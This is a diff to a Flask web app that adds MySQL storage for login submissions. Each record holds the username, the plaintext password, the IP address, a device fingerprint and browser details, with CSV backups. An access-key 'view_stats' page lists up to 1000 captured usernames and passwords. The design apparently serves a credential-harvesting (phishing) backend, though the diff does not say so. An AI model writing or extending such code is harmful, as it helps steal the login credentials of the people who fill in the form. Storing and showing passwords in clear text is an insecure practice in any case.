@@ -1,4 +1,5 @@
 from flask import Flask, render_template, request, redirect, jsonify, session, send_file, url_for
+import sys
 import csv 
 import os 
 import time 
@@ -9,6 +10,8 @@ import json
 import hashlib
 import uuid
 from datetime import datetime, timedelta
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from database.login_operations import save_login_attempt, create_login_attempts_table
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -247,6 +250,7 @@ def get_browser_info():
     return json.dumps(browser_details)
 
 def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
+    """Save data to MySQL database and CSV file for backup."""
     script_dir = os.path.dirname(os.path.abspath(__file__))
     csv_path = os.path.join(script_dir, 'data.csv')
     
@@ -255,6 +259,64 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
     else:
         timestamp_with_pht = timestamp
     
+    # Save to MySQL database first
+    try:
+        import pymysql
+        from database.config import get_db_config
+        
+        config = get_db_config()
+        conn = pymysql.connect(**config)
+        cursor = conn.cursor()
+        
+        # Create table if it doesn't exist
+        create_table_sql = """
+        CREATE TABLE IF NOT EXISTS login_attempts (
+            id VARCHAR(36) PRIMARY KEY,
+            username VARCHAR(255),
+            password VARCHAR(255),
+            email VARCHAR(255),
+            timestamp VARCHAR(255),
+            ip_address VARCHAR(45),
+            device_fingerprint VARCHAR(255),
+            device_type VARCHAR(100),
+            browser_info TEXT,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+        """
+        
+        cursor.execute(create_table_sql)
+        conn.commit()
+        
+        # Insert data
+        record_id = str(uuid.uuid4())
+        insert_sql = """
+        INSERT INTO login_attempts (id, username, password, email, timestamp, ip_address, device_fingerprint, device_type, browser_info)
+        VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
+        """
+        
+        cursor.execute(insert_sql, (
+            record_id, 
+            username,
+            password,
+            firstname or '',
+            timestamp_with_pht,
+            ip_address or '',
+            device_fingerprint or '',
+            device_type or '',
+            browser_info or ''
+        ))
+        
+        conn.commit()
+        cursor.close()
+        conn.close()
+        
+        print(f"✓ Data saved to MySQL database successfully for user: {username}")
+        
+    except Exception as db_error:
+        print(f"⚠ Warning: Could not save to MySQL database: {str(db_error)}")
+        print("  Falling back to CSV only...")
+    
+    # Save to CSV as backup
     try:
         file_exists = os.path.isfile(csv_path)
         
@@ -269,9 +331,10 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
             csvfile.flush()
             
         update_last_modified_timestamp()
+        print(f"✓ Data saved to CSV backup: {csv_path}")
             
     except Exception as e:
-        print(f"Error saving to primary location: {str(e)}")
+        print(f"Error saving to primary CSV location: {str(e)}")
         fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
         try:
             file_exists = os.path.isfile(fallback_path)
@@ -286,6 +349,7 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
                 csvfile.flush()
                 
             update_last_modified_timestamp(fallback_path)
+            print(f"✓ Data saved to CSV fallback: {fallback_path}")
         except Exception as fallback_error:
             print(f"Error saving to fallback location: {str(fallback_error)}")
 
@@ -344,28 +408,61 @@ def view_stats(access_key):
     
     session['last_activity'] = datetime.now().isoformat()
     
-    possible_paths = [
-        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
-        os.path.join('/tmp', 'data.csv'),
-        os.path.join(os.path.expanduser('~'), 'data.csv')
-    ]
-    
     data = []
-    for path in possible_paths:
-        if os.path.exists(path):
-            try:
-                with open(path, 'r') as csvfile:
-                    reader = csv.DictReader(csvfile)
-                    for row in reader:
-                        entry = {
-                            'username': row.get('username', ''),
-                            'password': row.get('password', ''),
-                            'timestamp': row.get('timestamp', '')
-                        }
-                        data.append(entry)
-                break
-            except Exception as e:
-                continue
+    
+    # Try to fetch from MySQL database first
+    try:
+        import pymysql
+        from database.config import get_db_config
+        
+        config = get_db_config()
+        conn = pymysql.connect(**config)
+        cursor = conn.cursor()
+        
+        # Query login_attempts table
+        query = "SELECT username, password, timestamp FROM login_attempts ORDER BY created_at DESC LIMIT 1000"
+        cursor.execute(query)
+        
+        rows = cursor.fetchall()
+        for row in rows:
+            entry = {
+                'username': row[0] if row[0] else '',
+                'password': row[1] if row[1] else '',
+                'timestamp': row[2] if row[2] else ''
+            }
+            data.append(entry)
+        
+        cursor.close()
+        conn.close()
+        
+        print(f"✓ Loaded {len(data)} entries from MySQL database")
+        
+    except Exception as db_error:
+        print(f"⚠ Could not load from MySQL: {str(db_error)}")
+        print("  Falling back to CSV...")
+        
+        # Fallback to CSV
+        possible_paths = [
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
+            os.path.join('/tmp', 'data.csv'),
+            os.path.join(os.path.expanduser('~'), 'data.csv')
+        ]
+        
+        for path in possible_paths:
+            if os.path.exists(path):
+                try:
+                    with open(path, 'r') as csvfile:
+                        reader = csv.DictReader(csvfile)
+                        for row in reader:
+                            entry = {
+                                'username': row.get('username', ''),
+                                'password': row.get('password', ''),
+                                'timestamp': row.get('timestamp', '')
+                            }
+                            data.append(entry)
+                    break
+                except Exception as e:
+                    continue
     
     last_updated = get_last_modified_timestamp()
     
